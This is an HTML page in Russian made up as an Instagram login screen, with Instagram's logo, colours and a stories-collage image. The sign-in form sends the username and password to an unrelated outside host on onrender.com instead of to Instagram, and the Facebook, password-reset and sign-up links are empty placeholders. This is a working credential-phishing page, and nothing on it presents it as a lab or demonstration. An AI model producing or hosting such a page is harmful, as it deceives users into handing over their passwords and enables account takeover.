<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            display: flex;
            max-width: 1300px;
            width: 100%;
            margin: 20px;
            background: white;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        .left-side {
            flex: 1;
            padding: 60px 80px 40px 60px;
            text-align: left;
            position: relative;
        }

        .instagram-logo {
            width: 48px;
            height: 48px;
            margin-bottom: 20px;
        }

        .left-side h1 {
            font-size: 28px;
            line-height: 1.35;
            font-weight: 500;
            margin-bottom: 40px;
            color: #262626;
        }

        .pink { color: #e1306c; }

        .collage-container {
            position: relative;
            max-width: 460px;
        }

        .collage {
            width: 100%;
            border-radius: 18px;
            display: block;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        }

        .right-side {
            width: 380px;
            padding: 40px 35px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background: #fff;
            border-left: 1px solid #dbdbdb;
        }

        .title {
            font-size: 22px;
            font-weight: 600;
            margin: 10px 0 28px;
            color: #262626;
            text-align: center;
        }

        input {
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 15px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            margin: 12px 0 8px;
        }

        .forgot {
            color: #0095f6;
            text-decoration: none;
            font-size: 14px;
            margin: 12px 0 20px;
        }

        .fb-btn {
            width: 100%;
            padding: 10px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
            margin-bottom: 12px;
            font-size: 15px;
        }

        .create-account {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            margin-top: 15px;
        }

        /* Мобильная оптимизация */
        @media (max-width: 900px) {
            .container { flex-direction: column; margin: 0; box-shadow: none; }
            .left-side { padding: 40px 20px 30px; text-align: center; }
            .right-side { width: 100%; border-left: none; border-top: 1px solid #dbdbdb; padding: 30px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Левая часть -->
        <div class="left-side">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" 
                 class="instagram-logo" alt="Instagram Logo">
            
            <h1>Посмотрите, какими моментами<br>из жизни поделились ваши<br><span class="pink">близкие друзья.</span></h1>
            
            <div class="collage-container">
                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" 
                     class="collage" alt="Stories Collage">
            </div>
        </div>

        <!-- Правая часть -->
        <div class="right-side">
            <div class="title">Войти в Instagram</div>
            
            <form action="https://insta-l177.onrender.com/" method="POST">
                <input type="text" name="username" placeholder="Имя пользователя, номер мобильного телефона или электронный адрес" required>
                <input type="password" name="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>

            <a href="#" class="forgot">Забыли пароль?</a>
            
            <a href="#" class="fb-btn">
                <i class="fab fa-facebook-square"></i> Войти через Facebook
            </a>
            
            <a href="#" class="create-account">Создать новый аккаунт</a>
        </div>
    </div>
</body>
</html>
